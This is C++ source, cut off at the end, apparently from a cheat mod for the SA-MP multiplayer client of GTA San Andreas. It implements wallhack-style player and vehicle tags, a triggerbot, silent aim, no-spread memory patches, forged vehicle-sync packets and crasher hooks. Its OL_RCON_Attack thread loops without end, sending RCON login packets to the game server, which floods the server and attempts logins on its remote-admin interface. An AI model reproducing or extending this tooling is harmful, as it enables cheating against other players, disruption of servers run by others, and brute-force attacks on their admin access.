		PassengerData.sVehicleID = OLCheats->iVehicleID;
		vect3_copy(fGrabberPosition, PassengerData.fPosition);

		BitStream bsData;
		bsData.Write((BYTE)ID_PASSENGER_SYNC);
		bsData.Write((PCHAR)&PassengerData, sizeof(stPassengerData));
		g_RakFuncs->Send(&bsData, HIGH_PRIORITY, UNRELIABLE_SEQUENCED, 0);

		float fSpeed[3] = { 0, 0, -0.01f };

		VehicleSync(fGrabberPosition, fSpeed);

		OLCheats->bVehicleHologram = true;
	}
	else
	{
		vect3_copy(&g_Players->pLocalPlayer->pSAMP_Actor->pGTA_Ped->base.matrix[12],
			fGrabberPosition);
		OLCheats->bGotPositionMapGrabber = true;
	}
}

void OL_ForceCrash()
{
	for (;;)
		new int;
	abort();
}

DWORD WINAPI OL_RCON_Attack(LPVOID args)
{
	while (true)
	{
		WSADATA wsaData;
		if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
		{
			cheat_state_text("Error connect failed");
			continue;
		}
		SOCKET Socket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
		SOCKADDR_IN SockAddr;
		SockAddr.sin_family = AF_INET;
		SockAddr.sin_port = htons(g_SAMP->ulPort);
		SockAddr.sin_addr.s_addr = inet_addr(g_SAMP->szIP);
		std::string sIP(g_SAMP->szIP);
		std::stringstream ssIP(sIP);
		std::string part;
		std::string packet("SAMP");
		std::string sPass("test");


		while (std::getline(ssIP, part, '.'))
		{
			packet += (BYTE)atoi(part.c_str());
		}


		packet += (BYTE)(g_SAMP->ulPort & 0xFF);
		packet += (BYTE)(g_SAMP->ulPort >> 8 & 0xFF);


		packet += 'x';

		packet += (BYTE)(sPass.length() & 0xFF);
		packet += (BYTE)(sPass.length() >> 8 & 0xFF);

		packet += sPass;

		sendto(Socket, packet.c_str(), packet.length(), 0, (sockaddr*)&SockAddr, sizeof(sockaddr_in));
	}
}

void replaceAll(std::string& source, const std::string& from, const std::string& to)
{
	std::string newString;
	newString.reserve(source.length());  // avoids a few memory allocations

	std::string::size_type lastPos = 0;
	std::string::size_type findPos;

	while (std::string::npos != (findPos = source.find(from, lastPos)))
	{
		newString.append(source, lastPos, findPos - lastPos);
		newString += to;
		lastPos = findPos + from.length();
	}

	// Care for the rest after last occurrence
	newString += source.substr(lastPos);

	source.swap(newString);
}

void FriendsFinder(float *y)
{
	traceLastFunc("FriendsFinder()");
	if (!g_Players)
		return;
	if (gta_menu_active())
		return;
	float x = 2.0f;
	//pD3DFontFixed->Print(x, y, 0xFFFFFFFF, "Friends:");
	render->D3D_OL_Double_Trapezium(x - 2.0f, *y, pD3DFontChat->DrawLength("Friends: ") + pD3DFontChat->DrawHeight() + 4.0f, pD3DFontChat->DrawHeight() + 2.0f, MOD_SA_GROUP_COLOR1(255), MOD_SA_GROUP_COLOR2(255));

	*y += pD3DFontChat->DrawHeight() + 2.0f;
	std::ifstream inputFile;
	std::string nick;
	char	filename[512];
	snprintf(filename, sizeof(filename), "%s\\" M0D_FOLDER "%s", g_szWorkingDirectory, "friends.ini");
	inputFile.open(filename);
	static DWORD UpdateFriendsTick = GetTickCount();
	static int iFriends = 0;
	//static std::string nicklist;
	if (GetTickCount() > UpdateFriendsTick + 1000)
	{
		memset(g_NewModSa->iFriendID, 0, sizeof(g_NewModSa->iFriendID));
		memset(g_NewModSa->bIsFriend, 0, sizeof(g_NewModSa->bIsFriend));
		iFriends = 0;
		while (inputFile >> nick)
		{
			for (int i = 0; i < SAMP_MAX_PLAYERS; i++)
			{
				if (g_Players->sLocalPlayerID == i)
					continue;
				if (g_Players->pRemotePlayer[i] == NULL)
					continue;
				if (g_Players->pRemotePlayer[i]->iNameAllocated <= 0xF)
				{
					if (strcmp(nick.c_str(), g_Players->pRemotePlayer[i]->szPlayerName) == 0)
					{
						g_NewModSa->iFriendID[iFriends] = i;
						g_NewModSa->bIsFriend[i] = true;
						iFriends++;
					}
				}
				else
				{
					if (strcmp(nick.c_str(), g_Players->pRemotePlayer[i]->pszPlayerName) == 0)
					{
						g_NewModSa->iFriendID[iFriends] = i;
						g_NewModSa->bIsFriend[i] = true;
						iFriends++;
					}
				}

			}
		}
		inputFile.close();
		UpdateFriendsTick = GetTickCount();
	}
	for (int i = 0; i < iFriends; i++)
	{
		int FriendID = g_NewModSa->iFriendID[i];
		if (g_Players->sLocalPlayerID == FriendID)
			continue;
		if (g_Players->pRemotePlayer[FriendID] == NULL)
			continue;
		if (g_Players->pRemotePlayer[FriendID]->iNameAllocated <= 0xF)
		{
			char buffer[32];
			sprintf(buffer, "%s [ID: %d]", g_Players->pRemotePlayer[FriendID]->szPlayerName, FriendID);
			render->D3D_OL_Double_Trapezium(x, *y, pD3DFontChat->DrawLength(buffer) + pD3DFontChat->DrawHeight() + 2.0f, pD3DFontChat->DrawHeight() + 2.0f, OL_COLOR1_2(128), OL_COLOR1(128));
			pD3DFontChat->Print(buffer, samp_color_get(FriendID), x, *y, false, false);
			render->D3DLine(x - 2.0, *y, x - 2.0, *y + pD3DFontChat->DrawHeight() + 2.0f, OL_COLOR2(255));
			*y += pD3DFontChat->DrawHeight() + 2.0f;
		}
		else
		{
			char buffer[32];
			sprintf(buffer, "%s [ID: %d]", g_Players->pRemotePlayer[FriendID]->pszPlayerName, FriendID);
			render->D3D_OL_Double_Trapezium(x, *y, pD3DFontChat->DrawLength(buffer) + pD3DFontChat->DrawHeight() + 2.0f, pD3DFontChat->DrawHeight() + 2.0f, OL_COLOR1_2(128), OL_COLOR1(128));
			pD3DFontChat->Print(buffer, samp_color_get(FriendID), x, *y, false, false);
			render->D3DLine(x - 2.0, *y, x - 2.0, *y + pD3DFontChat->DrawHeight() + 2.0f, OL_COLOR2(255));
			*y += pD3DFontChat->DrawHeight() + 2.0f;
		}
	}
}



void PrintClock()
{
	if (gta_menu_active())
		return;
	float fY = (float)(pPresentParam.BackBufferHeight) - (pD3DFont_Footer->DrawHeight() + 10.0f) - 2.0f;
	char Clock[32];
	SYSTEMTIME	time;
	GetLocalTime(&time);
	snprintf(Clock, sizeof(Clock) - 1, " %02d:%02d:%02d", time.wHour, time.wMinute, time.wSecond);
	float timeLength = pD3DFontChat->DrawLength(Clock);
	float timeValueTextX = pPresentParam.BackBufferWidth - timeLength - 12;
	render->D3D_OL_Trapezium_Inverted(timeValueTextX, fY - pD3DFontChat->DrawHeight(), timeLength + pD3DFontChat->DrawHeight() + 12  , pD3DFontChat->DrawHeight(), OL_COLOR1(200));
	pD3DFontChat->PrintShadow(timeValueTextX, fY - pD3DFontChat->DrawHeight(), OL_COLOR2(255), Clock);
}


void new_renderPlayerTags()
{
	//DWORD dwLastBotProcessTick = GetTickCount();
	traceLastFunc("new_renderPlayerTags()");
	if (gta_menu_active())
		return;

	if (cheat_state->_generic.cheat_panic_enabled || !OLCheats->bPlayerTags)
	{
		if (g_dwSAMP_Addr && g_SAMP)
		{
			sampPatchDisableNameTags(0);
		}
		return;
	}

	if (g_dwSAMP_Addr && g_SAMP)
	{
		if ((GetAsyncKeyState(VK_TAB) < 0 && set.d3dtext_score) || g_Scoreboard->iIsEnabled || GetAsyncKeyState(VK_F10) < 0)
			return;

		sampPatchDisableNameTags(1);
	}

	if (!g_Players)
		return;

	float		fHealth, fArmor;
	char		buf[256];
	char		AFKText[] = "AFK";
	D3DCOLOR	color;
	byte alpha = 0xFF;

	g_NewModSa->iPlayersStreaming = 0;
	g_NewModSa->iFriendsStreaming = 0;

	for (int i = 0; i < SAMP_MAX_PLAYERS; i++)
	{
		if (i == g_Players->sLocalPlayerID)
			continue;

		actor_info *player = getGTAPedFromSAMPPlayerID(i);

		if (!player)
			continue;

		g_NewModSa->iPlayersStreaming++;
		if (g_NewModSa->bIsFriend[i])
			g_NewModSa->iFriendsStreaming++;

		CPed* pPed = pGameInterface->GetPools()->GetPed((DWORD*)player);
		
		if (!pPed)
			continue;

		//CVector pos = *pPed->GetPosition();
		CVector pHeadPos;
		D3DXVECTOR3 player_pos, player_pos_on_screen;
		pPed->GetBonePosition(BONE_HEAD2, &pHeadPos);

		player_pos.x = CVecToD3DXVEC(pHeadPos).x;
		player_pos.y = CVecToD3DXVEC(pHeadPos).y;
		player_pos.z = CVecToD3DXVEC(pHeadPos).z + 0.15;
		CalcScreenCoors(&player_pos, &player_pos_on_screen);

		if (player_pos_on_screen.z < 1.f)
			continue;

		bool IsPlayerAfk = g_Players->pRemotePlayer[i]->pPlayerData->iAFKState == 2;


		if (g_Players)
		{
			fHealth = g_Players->pRemotePlayer[i]->pPlayerData->fActorHealth;
			fArmor = g_Players->pRemotePlayer[i]->pPlayerData->fActorArmor;
		}
		else
			return;



		//int iAlpha = g_Players->pRemotePlayer[i]->pPlayerData->sShowNameTag ? 255 : 128;
		_snprintf_s(buf, sizeof(buf) - 1, "%s <%d>", getPlayerName(i), i);
		float Distance_Armour = 0;
		float NickName_offsetX = pFont_OL_Chat->DrawLength(buf);
		float NickName_offsetY = pFont_OL_Chat->DrawHeight();

		bool bArmor = false;
		bool bGod = false;
		if (fHealth > 8000100.0f)
		{
			fHealth = 8000100.0f;
			bGod = true; // uhmmm idk
		}
		fHealth *= NickName_offsetX / 100.0f;
		//fHealth *= 70.0f / 100.0f;

		render->D3D_OL_Trapezium(player_pos_on_screen.x - (NickName_offsetX / 2),
			player_pos_on_screen.y + Distance_Armour, NickName_offsetX + 2.0f, (fArmor > 0.0f) ? 8.0f : 5.f, OL_COLOR1(128));


		if (fArmor > 0.0f)
		{
			if (fArmor > 100.0f)
				fArmor = 100.0f;
			fArmor *= NickName_offsetX / 100.0f;
			render->D3D_OL_Trapezium(player_pos_on_screen.x + 1.0f - (NickName_offsetX / 2),
				player_pos_on_screen.y + 1.0f + Distance_Armour, fArmor - 2.0f, 3.0f,
				OL_COLOR3(128));
			Distance_Armour += 3.0f;
			bArmor = true;

		}


		if (bArmor)
		{
			render->D3D_OL_Trapezium(player_pos_on_screen.x + 1.0f - (NickName_offsetX / 2),
				player_pos_on_screen.y + 1.0f + Distance_Armour, fHealth - 2.0f - 6.0f / 2.0f, 6.0f - Distance_Armour, bGod ? OL_COLOR6(128) : OL_COLOR2(128));
		}
		else
		{
			render->D3D_OL_Trapezium(player_pos_on_screen.x + 1.0f - (NickName_offsetX / 2),
				player_pos_on_screen.y + 1.0f + Distance_Armour, fHealth - 2.0f, 3.0f - Distance_Armour, bGod ? OL_COLOR6(128) : OL_COLOR2(128));
		}

		pFont_OL_Chat->PrintShadow(player_pos_on_screen.x - (NickName_offsetX / 2), player_pos_on_screen.y - NickName_offsetY, samp_color_get(i, D3DCOLOR_ARGB(255, 0, 0, 0)), buf, true);

		if (g_NewModSa->bIsFriend[i])
		{
			pD3DFontChat->PrintShadow(player_pos_on_screen.x - (NickName_offsetX / 2), player_pos_on_screen.y - pD3DFontChat->DrawHeight() - pFont_OL_Chat->DrawHeight(), OL_COLOR2(255), "Friend");
		}

		if (g_BotFuncs->uiIsBot[i][0] == 1)
		{
			sprintf_s(buf, "BOT ID: %d", g_BotFuncs->uiIsBot[i][1]);
			pD3DFontChat->PrintShadow(player_pos_on_screen.x - (pD3DFontChat->DrawLength(buf) / 2), player_pos_on_screen.y - pD3DFontChat->DrawHeight() - pFont_OL_Chat->DrawHeight(), 0xFF808080, buf);
		}

		if (IsPlayerAfk)
		{
			pD3DFontChat->PrintShadow(player_pos_on_screen.x + (NickName_offsetX / 2), player_pos_on_screen.y - 11.0f, D3DCOLOR_ARGB(255, 0x99, 0x99, 0x99), AFKText);
		}

		switch (g_Players->pRemotePlayer[i]->pPlayerData->bytePlayerState)
		{
		case PLAYER_STATE_ONFOOT:
			sprintf_s(buf, "On Foot");
			color = D3DCOLOR_ARGB(255, 0, 255, 0);
			break;
		case PLAYER_STATE_DRIVER:
			sprintf_s(buf, "Driver");
			color = D3DCOLOR_ARGB(255, 255, 0, 0);
			break;
		case PLAYER_STATE_PASSENGER:
			sprintf_s(buf, "Passenger");
			color = D3DCOLOR_ARGB(255, 0, 0, 255);
			break;
		default:
			*buf = 0;
			color = D3DCOLOR_ARGB(255, 0xFF, 0x6A, 0);
			break;
		}
		if (buf)
		{
			Distance_Armour += 6.0f;//10.0f;
			pD3DFontChat->PrintShadow(player_pos_on_screen.x, player_pos_on_screen.y + Distance_Armour, color, buf);
		}
	}
	//DWORD lostTime = GetTickCount() - dwLastBotProcessTick;
	//if (lostTime != 0)
	//cheat_state_text("%d", GetTickCount() - dwLastBotProcessTick);
}


void NewRenderVehicleTags()
{
	//DWORD dwTick = GetTickCount();
	traceLastFunc("NewRenderVehicleTags()");

	if (OLCheats->bVehicleTags)
	{

		// don't run if the menu is active
		if (gta_menu_active())
			return;

		// no tags during panic attacks
		if (cheat_state->_generic.cheat_panic_enabled)
			return;

		// don't run if the pools don't exist
		if (!pGameInterface || !pGameInterface->GetPools())
			return;

		// don't run if we don't exist
		if (!pPedSelf)
			return;

		// don't display tags during certain key press & game events
		// g_dwSAMP_Addr will be set before sa-mp was completely initialized
		if (g_SAMP && g_dwSAMP_Addr &&
			(
			(GetAsyncKeyState(VK_TAB) < 0 && set.d3dtext_score)
				|| g_Scoreboard->iIsEnabled
				|| GetAsyncKeyState(VK_F10) < 0
				)
			)
			return;
		D3DXVECTOR3 vehicle_pos, vehicle_pos_on_screen;
		CVehicle *pVehicle = NULL;
		CVector vecVehiclepos;
		char buf[256];
		const vehicle_entry *vehicle;
		int	ESP_tag_vehicle_pixelOffsetY = 0;
		float ESP_tag_vehicle_D3DBox_pixelOffsetX = -0.5;
		float ESP_tag_vehicle_D3DBox_pixelOffsetY = -0.5;
		float ESP_tag_vehicle_posOffsetZ = 0;
		float vehicle_health = 0;
		if (!g_Vehicles)
			return;
		g_NewModSa->iVehiclesStreaming = 0;
		static int NearestCenterVehicleID = -1;
		float NearestDistance = -1;
		float DistPlayerScreen[2];
		for (int vehicleID = 0; vehicleID <= SAMP_MAX_VEHICLES; vehicleID++)
		{
			if (g_Vehicles->iIsListed[vehicleID] != 1)
				continue;
			if (g_Vehicles->pSAMP_Vehicle[vehicleID] == NULL)
				continue;
			if (g_Vehicles->pSAMP_Vehicle[vehicleID]->pGTA_Vehicle == NULL)
				continue;
			g_NewModSa->iVehiclesStreaming++;
			//g_Vehicles->pSAMP_Vehicle[vehicleID]->pGTA_Vehicle->
			//g_Vehicles->pSAMP_Vehicle[vehicleID]->pGTA_Vehicle->pos
			//vect3_copy(&g_Vehicles->pSAMP_Vehicle[vehicleID]->pGTA_Vehicle->base.matrix[12], fPos);
			vehicle_info *vinfo = getGTAVehicleFromSAMPVehicleID(vehicleID);

			if (vinfo == nullptr)
				continue;

			pVehicle = pGameInterface->GetPools()->GetVehicle((DWORD*)vinfo);
			if (isBadPtr_GTA_pVehicle(pVehicle))
				continue;
			//if (!pVehicle)
			//	continue;
			traceLastFunc("NewRenderVehicleTags() 2");
			vecVehiclepos = pVehicle->GetInterface()->Placeable.matrix->vPos;
			vehicle_pos.x = vecVehiclepos.fX;
			vehicle_pos.y = vecVehiclepos.fY;
			vehicle_pos.z = vecVehiclepos.fZ + ESP_tag_vehicle_posOffsetZ;
			CalcScreenCoors(&vehicle_pos, &vehicle_pos_on_screen);

			if (vehicle_pos_on_screen.z < 1.f)
				continue;
			vecVehiclepos.fX = vehicle_pos_on_screen.x;
			vecVehiclepos.fY = vehicle_pos_on_screen.y;
			if (vehicleID != g_Players->pLocalPlayer->sCurrentVehicleID)
			{
				DistPlayerScreen[0] = abs((g_NewModSa->fViewFinderPosition[0]) - (vehicle_pos_on_screen.x));
				DistPlayerScreen[1] = abs((g_NewModSa->fViewFinderPosition[1]) - (vehicle_pos_on_screen.y));
				float CurrentDistance = sqrtf((DistPlayerScreen[0] * DistPlayerScreen[0]) + (DistPlayerScreen[1] * DistPlayerScreen[1]));

				if (NearestDistance == -1)
				{
					NearestDistance = CurrentDistance;
				}

				if (CurrentDistance <= NearestDistance)
				{
					NearestDistance = CurrentDistance;
					NearestCenterVehicleID = vehicleID;
				}
			}
			float h = pD3DFontChat->DrawHeight();
			vehicle = gta_vehicle_get_by_id(g_Vehicles->pSAMP_Vehicle[vehicleID]->pGTA_Vehicle->base.model_alt_id);
			_snprintf_s(buf, sizeof(buf) - 1, "%s (%d)", vehicle->name, vehicleID);
			float w = pD3DFontChat->DrawLength(buf);

			// get color by primary vehicle color from colors palette
			//byte color[4];
			//pVehicle->GetColor(&color[0], &color[1], &color[2], &color[3]);
			//RwColor rwcolor = getVehicleColorRGB(color[0]);

			vehicle_health = g_Vehicles->pSAMP_Vehicle[vehicleID]->pGTA_Vehicle->hitpoints;

			if (vehicle_health > 1000.0f)
				vehicle_health = 1000.0f;

			// render vehicle name
			pD3DFontChat->PrintShadow(vecVehiclepos.fX, vecVehiclepos.fY - h + ESP_tag_vehicle_pixelOffsetY,
				OL_COLOR3(255), buf);
			render->D3D_OL_Trapezium(
				vecVehiclepos.fX + ESP_tag_vehicle_D3DBox_pixelOffsetX,
				vecVehiclepos.fY - 1.0f + ESP_tag_vehicle_pixelOffsetY + ESP_tag_vehicle_D3DBox_pixelOffsetY,
				w,
				5.0f,
				OL_COLOR1(32)
			);
			render->D3D_OL_Trapezium(
				vecVehiclepos.fX + ESP_tag_vehicle_D3DBox_pixelOffsetX + 1.0f,
				vecVehiclepos.fY + ESP_tag_vehicle_pixelOffsetY + ESP_tag_vehicle_D3DBox_pixelOffsetY,
				(vehicle_health / 10.0f)* (w - 2.0f) / 100,
				3.0f,
				OL_COLOR2(64)
			);
		}
		g_NewModSa->iAimVehicleID = NearestCenterVehicleID;
	}
	else
	{
		g_NewModSa->iVehiclesStreaming = *(DWORD *)0x96909CUL + 0;
		// I got 69 CUL0 to find that
		// https://youtu.be/LmLGxgxpB6U
	}
}

void OL_CalculateSpeed(int playerID, float fSpeed[3])
{
	int iServerTickRate = *(DWORD*)(g_dwSAMP_Addr + SAMP_ONFOOTSENDRATE);
	float fDPos[3];
	fDPos[0] = EnemyStats[playerID].fPlayerPos[LastTick::LAST][0] - EnemyStats[playerID].fPlayerPos[LastTick::SECOND_LAST][0];
	fDPos[1] = EnemyStats[playerID].fPlayerPos[LastTick::LAST][1] - EnemyStats[playerID].fPlayerPos[LastTick::SECOND_LAST][1];
	fDPos[2] = EnemyStats[playerID].fPlayerPos[LastTick::LAST][2] - EnemyStats[playerID].fPlayerPos[LastTick::SECOND_LAST][2];

	fSpeed[0] = fDPos[0] / (float)iServerTickRate;
	fSpeed[1] = fDPos[1] / (float)iServerTickRate;
	fSpeed[2] = fDPos[2] / (float)iServerTickRate;

	//cheat_state_text("%d %f, %f", playerID, fDPos[0], fSpeed[0]);

}


//
void OL_CalculateLagPosition(int playerID, float fPos[3])
{
	traceLastFunc("OL_CalculateLagPosition");
	//static DWORD dwUpdateScoreboardTick = GetTickCount() + 3000;
	int iPlayerTickRate = EnemyStats[playerID].iPlayerOnFootTick[LastTick::LAST] - EnemyStats[playerID].iPlayerOnFootTick[LastTick::SECOND_LAST];
	int iServerTickRate = *(DWORD*)(g_dwSAMP_Addr + SAMP_ONFOOTSENDRATE);

	// I want use this like a ping
	// abs coz sometimes this is negative
	int iTickGap = abs(iServerTickRate - iPlayerTickRate); 
	float fInitialSpeed[3];
	OL_CalculateSpeed(playerID, fInitialSpeed);

	vect3_copy(EnemyStats[playerID].fPlayerPos[LastTick::LAST], fPos);
	int iDLocalTick = GetTickCount() - EnemyStats[playerID].iPlayerOnFootTick[LastTick::LAST];
	
	// for don't flood update request
	/*
	if (GetTickCount() - dwUpdateScoreboardTick >= 3000)
	{
		updateScoreboardData();
		dwUpdateScoreboardTick = GetTickCount();
	}*/

	updateScoreboardData();

	// 1.4 is the ratio of ping from samp browser, and ping from scoreboard
	int iPing = (g_Players->iLocalPlayerPing + g_Players->pRemotePlayer[playerID]->iPing)/1.4f;

	fPos[0] += fInitialSpeed[0] * (float)(iTickGap + iDLocalTick + iPing);
	fPos[1] += fInitialSpeed[1] * (float)(iTickGap + iDLocalTick + iPing);
	fPos[2] += fInitialSpeed[2] * (float)(iTickGap + iDLocalTick + iPing);

	//Log("%.0f %.0f %.0f", fInitialSpeed[0], fInitialSpeed[1], fInitialSpeed[2]);

	D3DXVECTOR3 vPos, vPosScreen;
	vPos.x = fPos[0];
	vPos.y = fPos[1];
	vPos.z = fPos[2];
	CalcScreenCoors(&vPos, &vPosScreen);



	//render->D3DBox(vPosScreen.x - 5.0f, vPosScreen.y - 5.0f, 10.0f, 10.0f, 0xFFFF0000);

}





void OL_TriggerFinger()
{
	static bool bPressed = false;

	if (bPressed)
	{
		mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
		bPressed = false;
	}

	if (OLCheats->bAutoShot)
	{

		if (!g_Players)
			return;

		if (g_Players->pLocalPlayer->onFootData.stSampKeys.keys_aim)
		{
			int playerID = GetAimingPlayer(false);

			actor_info *player = getGTAPedFromSAMPPlayerID(playerID);
			if (!player)
				return;

			CPed* pPed = pGameInterface->GetPools()->GetPed((DWORD*)player);
			if (!pPed)
				return;

			CVector vecLeftHand, vecRightHand, vecHead, vecRightFoot;
			float fX[2], fY[2];
			pPed->GetBonePosition(BONE_LEFTHAND, &vecLeftHand);
			pPed->GetBonePosition(BONE_RIGHTHAND, &vecRightHand);
			pPed->GetBonePosition(BONE_RIGHTFOOT, &vecRightFoot);
			pPed->GetBonePosition(BONE_HEAD, &vecHead);

			D3DXVECTOR3 vecLH_temp, vecRH_temp, vecH_temp, vecRF_temp, vecLH, vecRH, vecH, vecRF;

			vecLH_temp.x = vecLeftHand.fX;
			vecLH_temp.y = vecLeftHand.fY;
			vecLH_temp.z = vecLeftHand.fZ;

			vecRH_temp.x = vecRightHand.fX;
			vecRH_temp.y = vecRightHand.fY;
			vecRH_temp.z = vecRightHand.fZ;

			vecRF_temp.x = vecRightFoot.fX;
			vecRF_temp.y = vecRightFoot.fY;
			vecRF_temp.z = vecRightFoot.fZ;

			vecH_temp.x = vecHead.fX;
			vecH_temp.y = vecHead.fY;
			vecH_temp.z = vecHead.fZ;

			CalcScreenCoors(&vecLH_temp, &vecLH);
			CalcScreenCoors(&vecRH_temp, &vecRH);
			CalcScreenCoors(&vecH_temp, &vecH);
			CalcScreenCoors(&vecRF_temp, &vecRF);

			fX[0] = (vecLH.x < vecRH.x) ? vecLH.x : vecRH.x;
			fX[1] = (vecLH.x > vecRH.x) ? vecLH.x : vecRH.x;

			fY[0] = vecRF.y;
			fY[1] = vecH.y;
			cheat_state_text("%d", playerID);

			if (g_NewModSa->fViewFinderPosition[0] >= fX[0]
				&& g_NewModSa->fViewFinderPosition[0] <= fX[1]
				&& g_NewModSa->fViewFinderPosition[1] >= fY[1]
				&& g_NewModSa->fViewFinderPosition[1] <= fY[0])
			{
				mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
				bPressed = true;
			}
		}
	}
}

std::string upperCase(std::string input) {
	for (std::string::iterator it = input.begin(); it != input.end(); ++it)
		*it = toupper(*it);
	return input;
}

void OL_NoSpread()
{
	static bool bSetted = false;
	if (OLCheats->bNoSpread)
	{
		if (!bSetted)
		{
			for (int addr = 0xC8C450; addr < 0xC8C8B0; addr += 0x70)
				*(DWORD *)addr = 0x40000000;
			bSetted = true;
		}
	}
	else
	{
		if (bSetted)
		{
			for (int addr = 0xC8C450; addr < 0xC8C8B0; addr += 0x70)
				*(DWORD *)addr = 0x3F800000;
			bSetted = false;
		}
	}
}

void OL_SlowAim()
{
	static bool bSetted = false;
	static float fCurrentSens;
	if (OLCheats->bSlowAim)
	{
		if (!bSetted)
		{
			fCurrentSens = *(float *)0xB6EC1C;
			bSetted = true;
		}
		if (g_Players->pLocalPlayer->onFootData.stSampKeys.keys_aim)
		{
			float fSens = fCurrentSens;
			fSens *= pow(10, 6);
			fSens -= OLCheats->fSlowValue;
			fSens /= pow(10, 6);
			*(float *)0xB6EC1C = fSens;
		}
		else
		{
			*(float *)0xB6EC1C = fCurrentSens;
		}
	}
	else
	{
		if (bSetted)
		{
			bSetted = false;
		}
	}
}


char suggestions[11][53]
{
	"Do you like this mod?",
	"You can use menu with mouse by pressing SHIFT + F11.",
	"You can use OL Chat like the samp chat.",
	"Try new car grabber.",
	"Overlight Silent Aim works with lagcomp off too.",
	"You can use OL Chat for anything.",
	"Help us to know how to improve this mod.",
	"Did you find a bug? Please let us know!",
	"Have fun!",
	"You can drag the menu by drag the logo with mouse.",
	"Try Deathmatch stuff."
};

void OL_ShowSuggestion(float x, float y)
{
	float ParHeight = pD3DFont_Footer->DrawHeight() + 10;
	static char *suggestion = suggestions[rand() % 11];
	float fMaxWidth = pD3DFontChat->DrawLength(suggestion) + pD3DFontChat->DrawHeight();
	static float fCurrentWidth = 0;
	static bool bShowed = false, bStartShow = false;
	static DWORD dwShowTick;

	if (!bShowed)
	{
		if (fCurrentWidth < fMaxWidth)
		{
			fCurrentWidth += 5.f;
			render->D3D_OL_Parallelogram(ParHeight * 1.5f + x, y, fCurrentWidth, pD3DFontChat->DrawHeight(), OL_COLOR1(200));
		}
		else
		{
			if (!bStartShow)
				dwShowTick = GetTickCount();
			render->D3D_OL_Parallelogram(ParHeight * 1.5f + x, y, fCurrentWidth, pD3DFontChat->DrawHeight(), OL_COLOR1(200));
			pD3DFontChat->Print(suggestion, OL_COLOR2(255), ParHeight * 1.5f + x, y, false, false);
			bStartShow = true;
			if (GetTickCount() - dwShowTick > 20000)
				bShowed = true;
		}
	}
	else
	{
		if (fCurrentWidth > 0)
		{
			render->D3D_OL_Parallelogram(ParHeight * 1.5f + x, y, fCurrentWidth, pD3DFontChat->DrawHeight(), OL_COLOR1(200));
			fCurrentWidth -= 5.f;
			if (fCurrentWidth <= 0)
			{
				fCurrentWidth = 0;
			}
		}
		else
		{
			if (GetTickCount() - dwShowTick > 40000)
			{
				suggestion = suggestions[rand() % 11];
				bStartShow = false;
				bShowed = false;
			}
		}
	}


}

void OL_ChangeSettings(char *name, char *value)
{
	traceLastFunc("OL_ChangeSettings");
	std::fstream inputFile;
	std::ofstream outputFile;
	char filename[512];
	std::string strName(name);
	std::string strUpdatedLine;
	std::string strCurrentLine;
	snprintf(filename, sizeof(filename), "%s\\" M0D_FOLDER "%s", g_szWorkingDirectory, "OverLight_Settings.ini");
	inputFile.open(filename, std::ios::in);
	snprintf(filename, sizeof(filename), "%s\\" M0D_FOLDER "%s", g_szWorkingDirectory, "OverLight_Settings_temp.ini");
	outputFile.open(filename);
	strUpdatedLine += name;
	strUpdatedLine += " = ";
	strUpdatedLine += value;
	while (std::getline(inputFile, strCurrentLine))
	{
		if (strCurrentLine.find(strName) != std::string::npos)
		{
			strCurrentLine = strUpdatedLine;
		}
		outputFile << strCurrentLine << std::endl;
	}
	inputFile.close();
	outputFile.close();

	//

	snprintf(filename, sizeof(filename), "%s\\" M0D_FOLDER "%s", g_szWorkingDirectory, "OverLight_Settings_temp.ini");
	inputFile.open(filename, std::ios::in);
	snprintf(filename, sizeof(filename), "%s\\" M0D_FOLDER "%s", g_szWorkingDirectory, "OverLight_Settings.ini");
	outputFile.open(filename);

	while (std::getline(inputFile, strCurrentLine))
	{
		outputFile << strCurrentLine << std::endl;
	}
	inputFile.close();
	outputFile.close();

}



void OL_VehCheats()
{
	OLCheats->bIsVehCheatActive = false;
	OLCheats->bIsPlayerCheatActive = false;
	if (!g_Players)
		return;
	float y = pPresentParam.BackBufferHeight / 2;

	if (OLCheats->bPrintFriends)
		FriendsFinder(&y);
	if (OLCheats->bPrintClock)
		PrintClock();

	OL_NoSpread();
	OL_SlowAim();

	OL_TriggerFinger();
	OL_AntiStun();

	OL_Spectate();

	new_renderPlayerTags();
	NewRenderVehicleTags();
	
	VehicleBugger();

	if (OLCheats->bSilentAim)
		g_NewModSa->iAimPlayerID = GetAimingPlayer();
	if (g_BotFuncs->BotSettings.bBotPick)
		g_NewModSa->iAimClientBot = GetAimingBot();

	if (OLCheats->bRCON_Attack
		&& !OLCheats->bRCON_Attack_State)
	{
		DWORD dwThreadRCON;
		OLCheats->hRCON = CreateThread(NULL, 0, OL_RCON_Attack, NULL, 0, &dwThreadRCON);
		OLCheats->bRCON_Attack_State = true;
	}
	
	if (!OLCheats->bRCON_Attack
		&& OLCheats->bRCON_Attack_State)
	{

		TerminateThread(OLCheats->hRCON, 0);
		CloseHandle(OLCheats->hRCON);
		OLCheats->bRCON_Attack_State = false;

	}

	Crasher();

	//carcheats
	static bool bVehCheat = false;
	static DWORD SendCarTickCount = GetTickCount();
	if ((GetTickCount() - SendCarTickCount) >= OLCheats->SendRateCarCheatTick)
	{
		if (OLCheats->bVehicleElevator || OLCheats->bVehicleElevatorDown)
			OL_VehicleElevator();
		if (OLCheats->bCarShooter)
			OL_CarShooter();
		if (OLCheats->bFantozziCloud)
			OL_FantozziCloud();
		if (OLCheats->bDoorStorm)
			OL_DoorStorm();
		if (OLCheats->bFakeShooter)
			OL_FakeShooter();
		if (OLCheats->bShooterOnce)
			OL_CarShooter_Once();
		if (OLCheats->bFusRoDah)
			OL_FusRoDah();

		OL_TrailerGrabber();

		if (OLCheats->bVehicleGrabber)
		{
			OL_VehicleGrabber();
		}
		else 
		{
			if(!OLCheats->bTrailerGrabber)
				OLCheats->bGotPositionGrabber = false;
		}

		if (OLCheats->bVehicleGrabberMap)
		{
			OL_VehicleMapGrabber();
		}
		else
		{
			OLCheats->bGotPositionMapGrabber = false;
		}

		bVehCheat = OLCheats->bIsVehCheatActive;
		SendCarTickCount = GetTickCount();
	}
	else 
	{
		OLCheats->bIsVehCheatActive = bVehCheat;
	}
	//car cheats not send rate

	if (OLCheats->bPickCar)
		OL_CarPick();
	if (OLCheats->bInvisibleBike)
		OL_InvisibleBike();
	if (OLCheats->bVortexCrasher
